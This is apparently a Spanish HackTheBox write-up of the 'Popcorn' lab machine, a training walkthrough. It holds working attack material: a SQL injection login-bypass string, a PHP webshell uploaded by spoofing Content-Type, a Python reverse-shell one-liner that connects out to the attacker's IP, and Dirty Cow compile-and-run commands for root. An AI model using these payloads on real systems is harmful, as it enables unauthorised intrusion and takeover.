---
title: 'Popcorn Write Up [OSCP-Style]'
disqus: HackTheBox 
---

Popcorn WRITE UP [OSCP-Style]
===

Hecho por @xlcc4096 y @CapitanJ4ck21  

## Indice 

[TOC]

> Popcorn es una máquina linux de Hackthebox la cual descubriremos mediante fuzzing de directorios al servidor web que tiene un directorio que corre 'TorrentHoster' y a través de una subida de archivos conseguimos subir una shell que nos dara acceso al sistema como www-data. Después veremos que al ser un sistema antiguo es vulnerable a 'Dirty Cow' y conseguiremos privilegios maximo en el sistema una vez ejecutado el exploit.

## Enumeración
### Escaneo de puertos

Empezamos escaneando y enumerando todo el rango de puertos TCP y encontramos que tiene un servicio SSH y un HTTP abierto,
```bash=
nmap -Pn -n -vvv -p- -sS --min-rate 5000 -A -oN targeted 10.10.10.X
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/8%OT=22%CT=1%CU=38756%PV=Y%DS=2%DC=T%G=Y%TM=5FCFD7C
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=CB%GCD=1%ISR=CB%TI=Z%CI=Z%TS=8)SEQ(SP=CB%
OS:GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M54DST11NW6%O2=M54DST11NW6%O3=M5
OS:4DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=16A0%W2=16A0
OS:%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=
OS:16A0%S=O%A=S+%F=AS%O=M54DST11NW6%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.543 days (since Tue Dec  8 07:42:51 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   32.75 ms 10.10.14.1
2   55.90 ms 10.10.10.6

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:45
Completed NSE at 20:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.70 seconds
           Raw packets sent: 129533 (5.705MB) | Rcvd: 72827 (2.919MB)
```

### Puertos 80 / TCP
Empezamos enumerando el servidor HTTP con ffuf para fuzzear directorios y nos descubre un directorio torrent, al cual entramos.
```bash=
ffuf -u http://10.10.10.6/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -fs 177
```
```go=
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.6/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 177
________________________________________________

test                    [Status: 200, Size: 47079, Words: 2465, Lines: 651]
torrent                 [Status: 301, Size: 310, Words: 20, Lines: 10]
rename                  [Status: 301, Size: 309, Words: 20, Lines: 10]
```

Cuando entramos nos encontramos con esto:

![](https://i.imgur.com/8CXnkXH.png)

Vemos que hay un login al cual mediante SQLi intentaremos bypassear satisfactoriamente

```
Login: a'or true -- -
password: a'or true -- -
```
Dentro del TorrentHoster detectamos que podemos subir archivos.

![](https://i.imgur.com/YVO2dCC.png)

Primero subimos un archivo normal para ver como actuaba y cuando fuimos a visitar donde se habia subido nos daba la opcion de añadir un screenshot a la subida, cabe destacar que se intento subir una shell desde el torrent-uploader pero no hubo exito. Al ver lo de que podiamos subir un screenshot empezamos a intentar subir webshells a través de ahi.

## Explotación
De primeras intentamos subir un archivo `.php` pero no nos lo permitía, después subimos un archivo `.jpg%00.php` para verificar si estaba chequeando la extension o no, tampoco nos dejo, después de esto a la hora de la subida de nuestra web-shell nos pusimos a modificar el 'Content-Type' y le pusimos el 'Content-Type' de una imagen, y conseguimos subirla nuestra shell al servidor.

> **NOTA**: El fragmento de abajo esta sacado de burpsuite
```php=
Content-Disposition: form-data; name="file"; filename="elite.php"
Content-Type: image/jpeg

<?php echo "<pre>"; system($_GET[cmd]); ?>
```
Una vez subida nuestra webshell ponemos a la escucha nuestro netcat y visitamos la shell, introducimos una reverse-shell y se nos devuelve una conexión a nuestro sistema.

```¡
http://10.10.10.6/URL-img/?cmd=export RHOST="10.10.14.15";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

# Escalada de Privilegios
## Enumeración

Una vez dentro chequeamos la version del sistema y vemos que es vulnerable a 'Dirty Cow'. 
```bash=
uname -a
```

## Explotación
https://www.exploit-db.com/exploits/40839
Lo que hace este exploit es cambiar las propiedades del usuario root alterando el /etc/passwd poniendo el nombre de usuario que tu quieras a este y cambiandole la contraseña.
Pasamos el archivo '.c' a la máquina objetivo, lo compilamos y lo ejecutamos.
```bash=
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```
Una vez hecho se habra cambiado la contraseña del root a la deseada.
Entramos con nuestras nuevas credenciales a este usuario
```bash=
su root
```
Y ya somos root.